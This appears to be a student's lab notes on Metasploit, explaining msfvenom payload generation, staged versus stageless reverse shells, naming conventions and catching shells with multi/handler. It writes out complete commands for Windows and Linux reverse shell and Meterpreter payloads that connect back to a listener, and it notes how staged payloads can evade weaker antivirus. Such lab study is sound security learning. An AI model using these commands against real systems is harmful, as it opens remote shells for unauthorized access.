## msfvenom
Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).

The standard syntax for msfvenom is as follows:
	`msfvenom -p <PAYLOAD> <OPTIONS>`

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
	`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

![[Pasted image 20240818165141.png]]

Here we are using a payload and four options:
- **-f** `<format>`  Specifies the output format. In this case that is an executable (exe)
- **-o** `<file>` The output location and filename for the generated payload.
- **LHOST=**`<IP>` Local host, specify the machine connect back to.
- **LPORT=**`<port>` The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn’t already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

### _Staged vs Stageless_
- _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  
- _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

*Note*:
	Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.


### _Payload Naming Conventions_
The basic convention is as follows:
	`<OS>/<arch>/<payload>`

For example:
	`linux/x86/shell_reverse_tcp`

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
	`windows/shell_reverse_tcp`

The staged equivalent to this payload would be:
	`windows/shell/reverse_tcp`

Note:
	- **Stageless** payloads are denoted with underscores (`_`).
	- **Staged** payloads are denoted with another forward slash (`/`).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
	`windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:
	`linux/x86/meterpreter_reverse_tcp`


Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:
	`msfvenom --list payloads`

![[Pasted image 20240818170221.png]]

	`msfvenom --list payloads | grep "linux/x64"`
	
![[Pasted image 20240818170305.png]]

	msfvenom --list formats
	
![[Pasted image 20240818170339.png]]

Q) What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`.
	`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`


## multi/handler
Multi/Handler is a a tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
1. Open Metasploit with `msfconsole`
2. Type `use multi/handler`, and press enter

We are now primed to start a multi/handler session. Let's take a look at the available options using the `options` command.

There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST _must_ be specified here, as metasploit will not listen on all network interfaces like netcat or socat will;
- `set PAYLOAD <payload>`
- `set LHOST <listen-address>`
- `set LPORT <listen-port>`

Using the `exploit -j` command it tells Metasploit to launch the module, running as a job in the background.
![[Pasted image 20240820040300.png]]

Note:
	You may notice that in the above screenshot, Metasploit is listening on a port under `1024`. To do this, Metasploit _must_ be run with `sudo` permissions.

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:
![[Pasted image 20240820040454.png]]

Notice that, because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use `sessions` to see all active sessions